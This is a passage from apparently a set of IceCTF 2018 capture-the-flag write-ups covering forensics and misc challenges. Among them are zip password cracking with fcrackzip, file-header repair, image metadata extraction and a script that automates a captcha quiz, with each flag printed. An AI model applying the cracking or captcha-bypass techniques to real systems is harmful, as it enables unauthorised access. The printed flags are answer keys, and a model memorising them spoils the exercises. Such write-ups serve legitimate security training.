</pre></table></code></div></div><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>flag
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="modern-picasso"> Modern Picasso <a href="/CTF-writeups-public/writeups/IceCTF-2018/forensics-150-modern-picasso.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Here’s a rendition of some modern digital abstract art. Is it more than art though?</p><p><img src="writeupfiles/picasso.gif" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Using imagemagick to convert the white background in each frame to transparant:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>convert picasso.gif -transparent white picasso_transparent.gif
</pre></table></code></div></div><p>gives a gif that slowly builds up the flag:</p><p><img src="writeupfiles/picasso_transparent.gif" alt="" /></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{wow_fast}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{wow_fast} </code><hr><h1 id="hard-shells"> Hard Shells <a href="/CTF-writeups-public/writeups/IceCTF-2018/forensics-200-hard-shells.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After a recent hack, a laptop was seized and subsequently analyzed. The victim of the hack? An innocent mexican restaurant. During the investigation they found this suspicous file. Can you find any evidence that the owner of this laptop is the culprit?</p><p><a href="writeupfiles/hardshells">file</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>the file is an encrypted zip file.</p><p>we use fcrackzip with the crackstation wordlist to find the password</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span>fcrackzip <span class="nt">-v</span> <span class="nt">--use-unzip</span>  <span class="nt">-D</span> <span class="nt">-p</span> wordlist hardshells.zip
<span class="s1">'hardshells/'</span> is not encrypted, skipping
found file <span class="s1">'hardshells/d'</span>, <span class="o">(</span>size <span class="nb">cp</span>/uc 309500/5242880, flags 9, chk 91d0<span class="o">)</span>
checking pw TILIGUL<span class="s1">'S

PASSWORD FOUND!!!!: pw == tacos
</span></pre></table></code></div></div><p>the <a href="writeupfiles/d">file we get</a> now is a Minix filesystem</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file d
d: Minix filesystem, V1, 30 char names, 20 zones
</pre></table></code></div></div><p>Running <code class="language-plaintext highlighter-rouge">strings</code>, we found <code class="language-plaintext highlighter-rouge">IHDR</code> indicating it might be a PNG file. Comparing<br /> the file (in vim) to a normal PNG file we discovered they’d changed PNG to PUG<br /> and the file became valid.</p><p>This gives us a nice screenshot of someone’s desktop, with the flag.</p><p><img src="./writeupfiles/dat.png" alt="" /></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{look_away_i_am_hacking}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{look_away_i_am_hacking} </code><hr><h1 id="lost-in-the-forest"> Lost in the Forest <a href="/CTF-writeups-public/writeups/IceCTF-2018/forensics-300-lost-in-the-forest.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> You’ve rooted a notable hacker’s system and you’re sure that he has hidden something juicy on there. Can you find his secret?</p><p><strong>Solution</strong><br /> We receive a zip file named ‘fs.zip’ which contains a partial root file system of our hacker’s machine. After unzipping we looked for all potentially interesting files:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>find -type f .
</pre></table></code></div></div><p>And spotted ‘./home/hkr/Desktop/clue.png’ which is just a picture of a red<br /> herring. Cute. So the other dozens of JPGs are probably also red herrings. Next<br /> we looked for more interesting files and just looked at them individually with<br /> a text editor:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>vim `find -type f .`
</pre></table></code></div></div><p>Most were rather uninteresting, but there was a base64 looking string,<br /> <code class="language-plaintext highlighter-rouge">./home/hkr/hzpxbsklqvboyou</code> which might be interesting later. In<br /> <code class="language-plaintext highlighter-rouge">.bash_history</code> there were some interesting commands:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>wget https://gist.githubusercontent.com/Glitch-is/bc49ee73e5413f3081e5bcf5c1537e78/raw/c1f735f7eb36a20cb46b9841916d73017b5e46a3/eRkjLlksZp
mv eRkjLlksZp tool.py
./tool.py ../secret &gt; ../hzpxbsklqvboyou
</pre></table></code></div></div><p>So that script generated the base64 stuff on the desktop. We’ll just write a <a href="./writeupfiles/lost-in-the-forest.py">decode version of the script</a> and decrypt our output.</p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{good_ol_history_lesson}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{good_ol_history_lesson} </code><hr><h1 id="hello-world"> Hello World! <a href="/CTF-writeups-public/writeups/IceCTF-2018/misc-10-hello-world.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Welcome to the competition! To get you started we decided to give you your first flag. The flags all start with the “IceCTF” and have some secret message contained with in curly braces “{” and “}”.</p><p>Within this platform, the challenges will be shown inside a frame to the right. For example purposes the download interface is shown on the right now. For static challenges you will need to click the large button in order to receive your challenge. For non static challenges, the lab itself will be shown on the right.</p><p>To submit the flag you can click the blue flag button in the bottom right hand corner.</p><p>Your flag is <code class="language-plaintext highlighter-rouge">IceCTF{this_is_a_flag}</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><code class="language-plaintext highlighter-rouge">CTRL+C, CTRL+V</code></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{this_is_a_flag}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{this_is_a_flag} </code><hr><h1 id="ilovebees"> ilovebees <a href="/CTF-writeups-public/writeups/IceCTF-2018/misc-200-ilovebees.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I stumbled on to this strange website. It seems like a website made by a flower enthusiast, but it appears to have been taken over by someone… or something.</p><p>Can you figure out what it’s trying to tell us?</p><p>https://static.icec.tf/iloveflowers/</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>website:</p><p><img src="writeupfiles/ilovebees_screenshot.png" alt="" /></p><p>The website seems to be a reference to Halo (https://en.wikipedia.org/wiki/I_Love_Bees)</p><p>We download the <a href="writeupfiles/static.icec.tf/iloveflowers/">entire website</a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wget -m https://static.icec.tf/iloveflowers/
</pre></table></code></div></div><p>After much searching, the flag turns out to be the favicon gif file:</p><p><img src="writeupfiles/static.icec.tf/iloveflowers/favicon.gif" alt="" /></p><p>We see nothing with <code class="language-plaintext highlighter-rouge">strings</code> or <code class="language-plaintext highlighter-rouge">binwalk</code> or in the exifdata, but after we extract all the frames to png images</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>convert -coalesce favicon.gif out%03d.png
</pre></table></code></div></div><p>and run examine the exifdata</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="nv">$ </span>exiftool out<span class="k">*</span>.png
<span class="o">========</span> out-0.png
ExifTool Version Number         : 10.60
File Name                       : out-0.png
Directory                       : <span class="nb">.</span>
File Size                       : 746 bytes
File Modification Date/Time     : 2018:09:16 18:45:41+02:00
File Access Date/Time           : 2018:09:16 18:45:56+02:00
File Inode Change Date/Time     : 2018:09:16 18:45:41+02:00
File Permissions                : rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 16
Image Height                    : 16
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Gamma                           : 2.2
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Palette                         : <span class="o">(</span>Binary data 285 bytes, use <span class="nt">-b</span> option to extract<span class="o">)</span>
Background Color                : 59
Modify Date                     : 2018:09:06 15:20:54
Datecreate                      : 2018-09-16T18:41:49+02:00
Datemodify                      : 2018-09-06T15:20:54+02:00
Image Size                      : 16x16
Megapixels                      : 0.000256
<span class="o">========</span> out-100.png
ExifTool Version Number         : 10.60
File Name                       : out-100.png

<span class="o">[</span>..]
</pre></table></code></div></div><p>we see that they each have binary metadata embedded that we can extract using the -b option:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>exiftool <span class="nt">-b</span> out<span class="k">*</span>.png <span class="o">&gt;</span> outbinary
</pre></table></code></div></div><p>this file doesnt look like much, we could probably clean it up, but a <code class="language-plaintext highlighter-rouge">strings</code> already gives us the flag:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="nv">$ </span>strings outbinary | <span class="nb">grep </span>Ice
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
IceCTF<span class="o">{</span>MY_FAVORITE_ICON<span class="o">}</span>
</pre></table></code></div></div><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{MY_FAVORITE_ICON}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{MY_FAVORITE_ICON} </code><hr><h1 id="anticaptcha"> anticaptcha <a href="/CTF-writeups-public/writeups/IceCTF-2018/misc-250-anticaptcha.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Wow, this is a big captcha. Who has enough time to solve this? Seems like a lot of effort to me!</p><p>https://gg4ugw5xbsr2myw-anticaptcha.labs.icec.tf/</p><p><img src="writeupfiles/anticaptcha_screenshot.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>looks like we will have to answer these questions to get the flag. We automate this:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">from</span> <span class="n">fractions</span> <span class="kn">import</span> <span class="n">gcd</span> <span class="k">as</span> <span class="n">_gcd</span>
<span class="kn">import</span> <span class="n">math</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">itertools</span> <span class="kn">import</span> <span class="n">count</span><span class="p">,</span> <span class="n">islice</span>
<span class="kn">from</span> <span class="n">math</span> <span class="kn">import</span> <span class="n">sqrt</span>

<span class="n">URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://gg4ugw5xbsr2myw-anticaptcha.labs.icec.tf/</span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">isprime</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">n</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="nf">all</span><span class="p">(</span><span class="n">n</span><span class="o">%</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">islice</span><span class="p">(</span><span class="nf">count</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="nf">int</span><span class="p">(</span><span class="nf">sqrt</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">_gcd</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="nf">int</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">nthword</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">b</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">  </span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)[</span><span class="nf">int</span><span class="p">(</span><span class="n">a</span><span class="p">)]</span>


<span class="n">asdf</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">'</span><span class="s">What is the greatest common divisor of (?P&lt;a&gt;[0-9]+) and (?P&lt;b&gt;[0-9]+)?</span><span class="sh">'</span><span class="p">:</span> <span class="n">gcd</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">Is (?P&lt;a&gt;[0-9]+) a prime number?</span><span class="sh">'</span><span class="p">:</span> <span class="n">isprime</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">What is the (?P&lt;a&gt;[0-9]+).. word in the following line:(?P&lt;b&gt;.*)</span><span class="sh">'</span><span class="p">:</span> <span class="n">nthword</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">What is the tallest mountain on Earth?</span><span class="sh">'</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mount Everest</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">What is the capital of Hawaii?</span><span class="sh">'</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span> <span class="sh">"</span><span class="s">Honolulu</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">What color is the sky?</span><span class="sh">'</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span> <span class="sh">"</span><span class="s">blue</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">What year is it?</span><span class="sh">'</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span> <span class="sh">"</span><span class="s">2018</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">Who directed the movie Jaws?</span><span class="sh">'</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span> <span class="sh">"</span><span class="s">Steven Spielberg</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">What is the capital of Germany?</span><span class="sh">'</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span> <span class="sh">"</span><span class="s">Berlin</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">Which planet is closest to the sun?</span><span class="sh">'</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mercury</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">How many strings does a violin have?</span><span class="sh">'</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span> <span class="sh">"</span><span class="s">4</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">How many planets are between Earth and the Sun?</span><span class="sh">'</span><span class="p">:</span> <span class="k">lambda</span><span class="p">:</span> <span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">,</span>
<span class="p">}</span>


<span class="n">data</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>

<span class="n">answers</span> <span class="o">=</span> <span class="p">[]</span>

<span class="n">html_doc</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">text</span>
<span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">html_doc</span><span class="p">,</span> <span class="sh">'</span><span class="s">html.parser</span><span class="sh">'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">td</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">soup</span><span class="p">.</span><span class="nf">find_all</span><span class="p">(</span><span class="sh">'</span><span class="s">td</span><span class="sh">'</span><span class="p">)):</span>
    <span class="k">if</span> <span class="n">idx</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">continue</span>

    <span class="n">text</span> <span class="o">=</span> <span class="n">td</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>

    <span class="n">matched</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="nf">for </span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">func</span><span class="p">)</span> <span class="ow">in</span> <span class="n">asdf</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
        <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
            <span class="n">matched</span> <span class="o">=</span> <span class="bp">True</span>
            <span class="n">answers</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nf">func</span><span class="p">(</span><span class="o">*</span><span class="n">match</span><span class="p">.</span><span class="nf">groups</span><span class="p">())))</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">matched</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt; %s &lt;</span><span class="sh">"</span> <span class="o">%</span> <span class="n">text</span><span class="p">)</span>



<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">Content-type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">'</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">answer</span><span class="sh">'</span><span class="p">:</span> <span class="n">answers</span><span class="p">})</span>
<span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">1000</span><span class="p">])</span>
</pre></table></code></div></div><p>when we get it right, the page responds with our flag</p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{ahh_we_have_been_captchured}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{ahh_we_have_been_captchured} </code><hr><h1 id="secret-recipe"> Secret Recipe <a href="/CTF-writeups-public/writeups/IceCTF-2018/misc-300-secret-recipe.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I found this secret recipe when I was digging around in my Icelandic grandmother’s attic. I have a feeling that she might have been a part of some secret organization. Can you see if there are any other secrets hidden in the recipe?</p><p><img src="writeupfiles/recipe.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Transcription:</p><blockquote><p>Leyniuppskrift:</p><p>Byrjaðu á að brjóta 5 egg og setja svo 3 matskeiðar af skyri í skál. Hrærið<br /> svo 9 desilítra af hveiti út í ásamt 3 desilítrum af mjólk. Svo skal setja 7<br /> teskeiðar af lyftidufti og 2 teskeiðar af vanilludropum áður enn það eru sett<br /> 9 grömm af smjöri í skálina.</p><p>Hrærið þessu rækilega saman og setjið svo út á pönnu.</p><p>Alveg eins og amma gerði þða</p></blockquote><p>Translation:</p><blockquote><p>Secret Recipe</p><p>Start breaking 5 eggs and then put 3 tablespoons of sprouts into a bowl. Stir<br /> 9 decilitres of flour together with 3 deciliters of milk. Then put 7<br /> teaspoons of baking soda and 2 teaspoons of vanilla pods before putting 9<br /> grams of butter in the bowl.</p><p>Stir this thoroughly and then place it on a pan.</p><p>Just like a grandmother made a pillow</p></blockquote><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>flag
